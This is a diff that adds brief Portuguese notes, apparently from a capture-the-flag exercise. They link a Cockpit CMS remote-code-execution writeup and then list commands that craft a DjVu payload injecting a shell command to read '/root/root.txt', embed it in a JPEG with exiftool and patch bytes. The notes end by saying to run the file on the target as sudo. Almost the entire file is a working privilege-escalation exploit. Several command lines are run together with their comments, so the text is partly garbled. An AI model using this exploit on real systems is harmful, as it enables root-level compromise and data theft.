@@ -1,0 +1,28 @@
+https://swarm.ptsecurity.com/rce-cockpit-cms/
+
+Depois de pegar shell olhar a pasta do usuario "ls-la"
+
+Depois usar os seguintes comandos na maquina
+
+# Download the image
+wget -qO sample.jpg placekitten.com/200# See file detailsfile sample.jpg
+
+# Create the PBM image
+printf 'P1 1 1 1' > input.pbm# Create mask layer from PBMcjb2 input.pbm mask.djvu
+
+# Create a DJVU
+djvumake exploit.djvu Sjbz=mask.djvu
+
+# Create the payload file
+echo -e '(metadata "\c${system('cat /root/root.txt')};")' > input.txt
+
+# Craft the exploit DJVU file with the payload
+djvumake exploit.djvu Sjbz=mask.djvu ANTa=input.txt
+
+# Embed DJVU file into the JPEG
+exiftool '-GeoTiffAsciiParams<=exploit.djvu' sample.jpg
+
+# Replace the bytes
+perl -0777 -pe 's/\x87\xb1/\xc5\x1b/g' < sample.jpg > exploit.jpg
+
+Agora mandamos para a maquina alvo e rodamos o arquivo como sudo
